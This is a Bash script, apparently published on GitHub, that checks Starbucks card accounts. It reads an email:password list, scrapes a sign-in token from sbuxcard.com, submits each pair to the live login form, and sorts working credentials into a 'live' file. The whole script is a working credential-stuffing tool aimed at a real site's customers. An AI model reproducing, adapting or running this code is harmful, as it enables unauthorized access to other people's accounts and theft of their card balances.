#!/bin/bash
waktu=$(date '+%Y-%m-%d %H:%M:%S')
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
LIGHTGREEN="\e[92m"
MARGENTA="\e[35m"
BLUE="\e[34m"
BOLD="\e[1m"
NOCOLOR="\e[0m"
header(){
printf "${GREEN}
██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ ██╗   ██╗██╗  ██╗
██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗██║   ██║╚██╗██╔╝
██████╔╝██║ █╗ ██║██╔██╗ ██║███████╗██████╔╝██║   ██║ ╚███╔╝ ${BLUE}
██╔═══╝ ██║███╗██║██║╚██╗██║╚════██║██╔══██╗██║   ██║ ██╔██╗ 
██║     ╚███╔███╔╝██║ ╚████║███████║██████╔╝╚██████╔╝██╔╝ ██╗
╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝${NOCOLOR}
         ------------------------------------
               SBUX ACCOUNT CHECKER !
                Github.com/Makavael
         ------------------------------------
"
}
login(){
	getcookie
	ua=$(cat ua.txt | sort -R | head -1)
	ambil=$(curl -s --compressed --cookie tmp/${random}_tmp "https://www.sbuxcard.com/index.php?page=signin" -L \
	-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0' \
	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
	-H 'Accept-Language: en-US,en;q=0.5' \
	-H 'Referer: https://www.sbuxcard.com/index.php?page=signin' \
	-H 'Content-Type: application/x-www-form-urlencoded' \
	-H 'Connection: keep-alive' \
	--data "token=${Token}&Email=$1&Password=$2&txtaction=signin&emailcount=$1&passcount=$2")
	if [[ $ambil =~ "index.php?page=account" ]]; then
		printf "${GREEN} LIVE =>${NOCOLOR} $1 $2 ${GREEN}[LIST LIVE : $(cat live.txt | wc -l | cut -f1 -d' ')]\n"
		echo "LIVE -> $1 | $2">>live.txt
	elif [[ $ambil =~ "index.php?page=signin" ]]; then
		printf "${RED} DIE =>${NOCOLOR} $1 $2 ${RED}[LIST DIE : $(cat die.txt | wc -l | cut -f1 -d' ')]\n"
		echo " -> $1 | $2">>die.txt
	else
		printf "TIDAK DIKETAHUI => $1 $2\n"

	fi
	rm tmp/${random}_tmp 2> /dev/null
}
getcookie(){
	random=$(echo $(shuf -i 0-999999 -n 1))
	AmbilTOken=$(curl -s --cookie-jar tmp/${random}_tmp "https://www.sbuxcard.com/index.php?page=signin" -L -D - | grep -Eo 'token\" value=\"(.?*)\"\/>')
	Tokenz=$(echo $AmbilTOken | sed 's/token\" value=\"//g' | sed 's/"\/>//g')
	Token=$(echo $Tokenz | sed -f urlencode)	

}
trapper=0
trap bashtrap INT
bashtrap(){
    if [ "$trapper" = 0 ]; then
        printf "\n\n${WH}CTRL+C has been detected!.....${RD}shutting down now\n\n${NC}"
        rm -rf tmp 2> /dev/null
        rm *_tmp 2> /dev/null
        sleep 1;
        ps aux | grep "$0" | cut -d' ' -f6 | while read diriku
        do
            kill -9 "$diriku" 2> /dev/null
        done
        exit 0;
    fi
}
if [[ ! -d tmp ]]; then
    mkdir tmp
fi
header
echo ""
echo "List In This Directory : "
ls
echo "Delimeter list -> email:password"
echo -n "Masukan File List : "
read list
if [ ! -f $list ]; then
	echo "$list No Such File"
	exit
fi
x=$(gawk -F: '{ print $1 }' $list)
y=$(gawk -F: '{ print $2 }' $list)
IFS=$'\r\n' GLOBIGNORE='*' command eval  'emails=($x)'
IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwords=($y)'
for (( i = 0; i < "${#emails[@]}"; i++ )); do
	email="${emails[$i]}"
	password="${passwords[$i]}"
	login $email $password
done
